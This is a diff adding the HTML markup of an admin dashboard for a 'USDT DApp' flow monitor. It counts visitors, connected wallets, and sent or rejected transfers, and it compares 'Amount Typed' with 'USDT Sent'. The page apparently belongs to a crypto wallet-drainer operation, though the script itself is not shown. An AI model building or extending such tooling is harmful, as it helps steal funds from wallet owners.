@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body class="admin-page">
+  <div class="admin-wrap">
+
+    <header class="admin-header">
+      <div>
+        <div class="admin-title">Admin Dashboard</div>
+        <div class="admin-sub">USDT DApp — Live Flow Monitor</div>
+      </div>
+      <div class="admin-actions">
+        <span class="admin-badge">ADMIN</span>
+        <button id="refresh-btn" class="abtn abtn-s">Refresh</button>
+        <button id="clear-btn" class="abtn abtn-d">Clear</button>
+      </div>
+    </header>
+
+    <!-- Flow Stats -->
+    <div class="stats">
+      <div class="stat"><div class="stat-v" id="stat-wallets">0</div><div class="stat-l">Total Visitors</div></div>
+      <div class="stat"><div class="stat-v" id="stat-connected">0</div><div class="stat-l">Connected</div></div>
+      <div class="stat"><div class="stat-v" id="stat-sending">0</div><div class="stat-l">Sending</div></div>
+      <div class="stat"><div class="stat-v" id="stat-sent">0</div><div class="stat-l">Sent Successfully</div></div>
+      <div class="stat"><div class="stat-v" id="stat-rejected">0</div><div class="stat-l">Rejected</div></div>
+      <div class="stat"><div class="stat-v" id="stat-active">0</div><div class="stat-l">Active Now</div></div>
+    </div>
+
+    <!-- Flow Explanation -->
+    <div class="flow-bar">
+      <span class="flow-step">1. Open page</span>
+      <span class="flow-arrow">→</span>
+      <span class="flow-step">2. Type amount</span>
+      <span class="flow-arrow">→</span>
+      <span class="flow-step">3. Click Send</span>
+      <span class="flow-arrow">→</span>
+      <span class="flow-step">4. Wallet connects</span>
+      <span class="flow-arrow">→</span>
+      <span class="flow-step">5. USDT sent</span>
+    </div>
+
+    <!-- Columns -->
+    <div class="cols">
+      <div class="col">
+        <div class="card">
+          <div class="card-h">Wallets & Flow</div>
+          <div id="wallet-list" class="wallet-list">
+            <div class="empty-msg">No wallets yet</div>
+          </div>
+        </div>
+      </div>
+      <div class="col">
+        <div class="card">
+          <div class="card-h">Transaction Log</div>
+          <div id="tx-log" class="tx-log">
+            <div class="empty-msg">No transactions yet</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="wallet-modal" class="modal hidden">
+      <div class="modal-box">
+        <div class="modal-top">
+          <div class="modal-h">Wallet Flow Detail</div>
+          <button id="modal-close" class="modal-x">&times;</button>
+        </div>
+        <div class="modal-body">
+          <div class="mrow"><span class="ml">Address</span><span class="mv mono" id="modal-address">-</span></div>
+          <div class="mrow"><span class="ml">Amount Typed</span><span class="mv" id="modal-amt-typed">-</span></div>
+          <div class="mrow"><span class="ml">USDT Sent</span><span class="mv" id="modal-usdt-sent">-</span></div>
+          <div class="mrow"><span class="ml">Status</span><span class="mv" id="modal-status">-</span></div>
+          <div class="mrow"><span class="ml">TX Hash</span><span class="mv mono" id="modal-tx">-</span></div>
+          <div class="card-h" style="margin-top:16px">Flow Steps</div>
+          <div id="modal-tx-list" class="tx-log"></div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+  <script src="admin.js"></script>
+</body>
+</html>
